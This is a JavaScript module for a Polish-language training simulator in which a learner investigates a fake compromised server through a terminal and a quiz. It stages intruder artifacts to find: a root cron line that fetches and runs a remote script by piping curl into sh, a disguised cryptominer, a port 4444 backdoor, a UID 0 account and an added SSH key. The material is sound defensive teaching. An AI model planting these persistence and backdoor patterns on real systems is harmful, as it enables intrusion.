import { h, runQuiz } from '../ui.js';
import { createTerminal, dir, file } from '../terminal-engine.js';
import { icon } from '../icons.js';

const USER = 'analityk';
const HOST = 'web01';
const INTRUDER = '203.0.113.45';

function buildTree() {
  return dir({
    home: dir({
      [USER]: dir({
        'ZLECENIE.txt': file(`Zgłoszenie: serwer web01 od rana działa bardzo wolno, a monitoring pokazuje 100% CPU.\nPodejrzewamy włamanie. Zbadaj system, ale niczego nie usuwaj, zanim nie zbierzesz dowodów.\nPrzydatne polecenia: last, ps aux, ss -tulpn, cat /etc/passwd, ls -la /etc/cron.d, grep Accepted /var/log/auth.log`)
      }),
      admin: dir({
        '.ssh': dir({
          authorized_keys: file(
            ['ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGp5c2tvcm93YW5pZQ admin@laptop-firmowy', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVrcnl0eWtsdWN6 root@vps-203-0-113-45'].join('\n'),
            '-rw-r--r--',
            'admin'
          )
        })
      })
    }),
    etc: dir({
      hostname: file(HOST, '-rw-r--r--', 'root'),
      passwd: file(
        [
          'root:x:0:0:root:/root:/bin/bash',
          'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
          'admin:x:1000:1000:Administrator:/home/admin:/bin/bash',
          `${USER}:x:1001:1001:Analityk SOC:/home/${USER}:/bin/bash`,
          'support2:x:0:0::/home/support2:/bin/bash'
        ].join('\n'),
        '-rw-r--r--',
        'root'
      ),
      shadow: file('', '-rw-r-----', 'root'),
      'cron.d': dir({
        'aktualizacja-systemu': file(`*/5 * * * * root curl -s http://${INTRUDER}/k.sh | sh`, '-rw-r--r--', 'root'),
        'logrotate': file('0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf', '-rw-r--r--', 'root')
      })
    }),
    tmp: dir({
      '.cache': dir({
        kworkerd: file('\u0001\u0002ELF dane binarne koparki kryptowalut\u0003\u0004', '-rwxr-xr-x', 'www-data')
      })
    }),
    var: dir({
      log: dir({
        'auth.log': file(
          [
            'Oct 14 02:41:10 web01 sshd[901]: Failed password for admin from 203.0.113.45 port 40112',
            'Oct 14 02:41:14 web01 sshd[901]: Failed password for admin from 203.0.113.45 port 40118',
            'Oct 14 02:41:19 web01 sshd[903]: Failed password for admin from 203.0.113.45 port 40121',
            'Oct 14 02:42:03 web01 sshd[907]: Accepted password for admin from 203.0.113.45 port 40130',
            'Oct 14 02:43:40 web01 sudo: admin : COMMAND=/usr/sbin/useradd -o -u 0 support2',
            'Oct 14 02:44:12 web01 sudo: admin : COMMAND=/usr/bin/tee -a /home/admin/.ssh/authorized_keys',
            'Oct 14 08:15:02 web01 sshd[2210]: Accepted publickey for analityk from 10.0.1.15 port 51522'
          ].join('\n'),
          '-rw-r--r--',
          'root'
        )
      })
    })
  });
}

const EXTRA_COMMANDS = {
  ps: () => [
    'USER       PID %CPU %MEM COMMAND',
    'root         1  0.0  0.1 /sbin/init',
    'root       512  0.0  0.2 /usr/sbin/sshd -D',
    'www-data   820  0.1  1.4 nginx: worker process',
    'www-data  1337 98.7  3.2 /tmp/.cache/kworkerd --pool 203.0.113.45:3333',
    'analityk  2214  0.0  0.1 -bash',
    'analityk  2290  0.0  0.0 ps aux'
  ],
  ss: () => [
    'Netid State  Local Address:Port  Process',
    'tcp   LISTEN 0.0.0.0:22          users:(("sshd",pid=512))',
    'tcp   LISTEN 0.0.0.0:80          users:(("nginx",pid=820))',
    'tcp   LISTEN 0.0.0.0:443         users:(("nginx",pid=820))',
    'tcp   LISTEN 0.0.0.0:4444        users:(("kworkerd",pid=1337))'
  ],
  netstat: () => [{ text: 'netstat to starsze polecenie, dziś używa się ss -tulpn. Wynik:', cls: 'term-warn' }, ...EXTRA_COMMANDS.ss()],
  last: () => [
    'analityk pts/0  10.0.1.15      Tue Oct 14 08:15   still logged in',
    `admin    pts/1  ${INTRUDER}   Tue Oct 14 02:42 - 03:10  (00:28)`,
    'admin    pts/0  10.0.1.15      Mon Oct 13 16:02 - 17:45  (01:43)'
  ],
  who: () => [`${USER} pts/0  2026-10-14 08:15 (10.0.1.15)`],
  crontab: () => [`brak crontaba dla ${USER}. Zadania systemowe są w katalogu /etc/cron.d`],
  kill: () => [{ text: 'Stop. Zanim zakończysz proces, zabezpiecz dowody (zrzut pamięci, kopia dysku) i odetnij serwer od sieci. Tutaj tylko badamy.', cls: 'term-warn' }]
};

const QUESTIONS = [
  {
    prompt: 'Z jakiego adresu IP zalogował się intruz? Sprawdź <code>last</code> albo <code>grep Accepted /var/log/auth.log</code>.',
    options: [
      { label: `<span class="mono">${INTRUDER}</span>`, correct: true, why: 'Po trzech nieudanych próbach przyszło udane logowanie hasłem na konto admin, w środku nocy, z obcego adresu.' },
      { label: '<span class="mono">10.0.1.15</span>', why: 'To adres wewnętrzny, z którego loguje się kluczem analityk, czyli Ty.' },
      { label: '<span class="mono">127.0.0.1</span>', why: 'To ten sam serwer (localhost). W logach go nie ma.' }
    ]
  },
  {
    prompt: 'Który proces jest podejrzany? Użyj <code>ps aux</code>.',
    options: [
      { label: '<code>/tmp/.cache/kworkerd</code> zużywający 98% procesora', correct: true, why: 'Nazwa udaje proces jądra (kworker), ale program działa z ukrytego katalogu w /tmp i łączy się z „pool” na adresie intruza. To koparka kryptowalut, stąd spowolnienie serwera.' },
      { label: '<code>nginx: worker process</code>', why: 'nginx to serwer WWW strony. Zużywa mało zasobów i działa z właściwej lokalizacji.' },
      { label: '<code>/usr/sbin/sshd -D</code>', why: 'To normalny serwer SSH.' }
    ]
  },
  {
    prompt: 'Na którym porcie intruz zostawił sobie furtkę? Użyj <code>ss -tulpn</code>.',
    options: [
      { label: '4444', correct: true, why: 'Port 4444 otworzył ten sam podejrzany proces kworkerd. Serwer WWW nie ma powodu nasłuchiwać na takim porcie.' },
      { label: '443', why: 'Na 443 działa nginx, czyli strona HTTPS.' },
      { label: '22', why: 'Na 22 działa sshd, czyli zwykłe SSH.' }
    ]
  },
  {
    prompt: 'Jak intruz zapewnił sobie powrót nawet po restarcie? Zajrzyj do <code>/etc/cron.d</code>.',
    options: [
      { label: 'Zadanie cron co 5 minut pobiera i uruchamia skrypt z jego serwera', correct: true, why: 'Plik udaje „aktualizację systemu”. Nawet jeśli usuniesz koparkę, za 5 minut wróci. Takie mechanizmy to persystencja.' },
      { label: 'Zadanie logrotate o 3:00', why: 'logrotate to zwykłe porządkowanie logów, standardowy element systemu.' },
      { label: 'Nie zostawił żadnego mechanizmu', why: 'Spójrz na plik aktualizacja-systemu w /etc/cron.d.' }
    ]
  },
  {
    prompt: 'Które konto w <code>/etc/passwd</code> jest furtką?',
    options: [
      { label: '<code>support2</code>, bo ma UID 0, czyli uprawnienia roota', correct: true, why: 'UID 0 oznacza konto administratora. Drugie konto z UID 0 to klasyczna furtka, a auth.log pokazuje, że założono je przez sudo tuż po włamaniu.' },
      { label: '<code>www-data</code>', why: 'To standardowe konto serwera WWW, bez możliwości logowania (nologin).' },
      { label: '<code>analityk</code>', why: 'To Twoje konto.' }
    ]
  },
  {
    prompt: 'Co zmieniło się w <code>/home/admin/.ssh/authorized_keys</code>?',
    options: [
      { label: 'Dopisano obcy klucz SSH, więc intruz wejdzie bez hasła', correct: true, why: 'Klucz z komentarzem root@vps-203-0-113-45 nie należy do administratora. Sama zmiana hasła nie wystarczy, bo klucz omija hasło.' },
      { label: 'Nic, oba klucze są firmowe', why: 'Drugi klucz pochodzi z serwera o adresie intruza.' }
    ]
  },
  {
    prompt: 'Na liście znalezisk: koparka, furtka na porcie 4444, zadanie cron, konto z UID 0 i obcy klucz SSH. Co dalej?',
    options: [
      { label: 'Odcinam serwer od sieci, zabezpieczam dowody, a potem stawiam go od nowa z czystego obrazu, zmieniam wszystkie hasła i klucze i łatam przyczynę', correct: true, why: 'Po przejęciu konta z uprawnieniami roota nie da się mieć pewności, że znalezione zostały wszystkie furtki. Bezpieczna droga to odbudowa z czystego obrazu i kopii danych.' },
      { label: 'Zabijam proces kworkerd i wracam do pracy', why: 'Cron za 5 minut uruchomi go ponownie, a konto support2 i obcy klucz zostaną.' },
      { label: 'Usuwam wszystkie logi, żeby nie przeszkadzały', why: 'Logi to dowody. Bez nich nie ustalisz, co się stało, ani nie zgłosisz incydentu.' }
    ]
  }
];

export default {
  id: 'sledztwo',
  title: 'Śledztwo na przejętym serwerze',
  category: 'obrona',
  icon: 'search',
  minutes: 15,
  summary: 'Serwer od rana działa na 100% procesora. Logujesz się jako analityk i terminalem szukasz śladów intruza: logowań, procesów, otwartych portów, zadań cron, kont i kluczy SSH.',
  lesson: [
    'Po włamaniu intruz zwykle robi trzy rzeczy: <strong>wykorzystuje</strong> serwer (np. kopie kryptowaluty), <strong>ukrywa się</strong> (nazwy udające procesy systemowe, ukryte katalogi) i zostawia sobie <strong>powrót</strong> (furtki, czyli persystencję).',
    'Analityk szuka śladów w kilku miejscach: kto się logował (<code>last</code>, <code>/var/log/auth.log</code>), co działa (<code>ps aux</code>), co nasłuchuje (<code>ss -tulpn</code>), co uruchamia się samo (<code>/etc/cron.d</code>), jakie są konta (<code>/etc/passwd</code>) i klucze (<code>authorized_keys</code>).',
    'Zasada numer jeden: najpierw <strong>zbierz dowody</strong>, potem sprzątaj. Pochopne usuwanie niszczy ślady, które pomogą ustalić, jak doszło do włamania.',
    'Zacznij od <code>cat ZLECENIE.txt</code>. Pytania obok terminala prowadzą Cię krok po kroku.'
  ],
  takeaways: [
    '<code>last</code> i <code>auth.log</code> pokazują, kto i skąd się logował. Udane logowanie po serii porażek to alarm.',
    '<code>ps aux</code> i <code>ss -tulpn</code> pokazują procesy i otwarte porty. Programy z <code>/tmp</code> i nazwy udające systemowe są podejrzane.',
    'Persystencję znajdziesz w cronie, w kontach z UID 0 i w dopisanych kluczach SSH.',
    'Po przejęciu roota serwer stawia się od nowa z czystego obrazu. Sprzątanie „na żywo” zawsze może coś pominąć.',
    'Najpierw dowody i izolacja, potem usuwanie. Incydent zgłaszasz według procedury.'
  ],
  async mount(stage, ctx) {
    const terminal = createTerminal({
      tree: buildTree(),
      user: USER,
      host: HOST,
      quick: ['cat ZLECENIE.txt', 'last', 'ps aux', 'ss -tulpn', 'cat /etc/passwd', 'ls -la /etc/cron.d'],
      intro: [
        ['Zalogowano na web01 jako analityk (symulator edukacyjny).', 'term-accent'],
        ['Zacznij od: cat ZLECENIE.txt', 'term-muted']
      ],
      extraCommands: EXTRA_COMMANDS
    });
    const questions = h('div', { class: 'stage' });
    stage.append(
      h(
        'div',
        { class: 'split' },
        h('div', { class: 'stage' }, terminal.element, terminal.quickBar),
        h('aside', { class: 'stage' }, h('div', { class: 'panel-title' }, icon('search'), h('h2', { class: 't-h4', text: 'Pytania śledczego' })), questions)
      )
    );
    const score = await runQuiz(questions, ctx, QUESTIONS, { label: 'Pytanie' });
    ctx.finish({ score, max: QUESTIONS.length });
  }
};
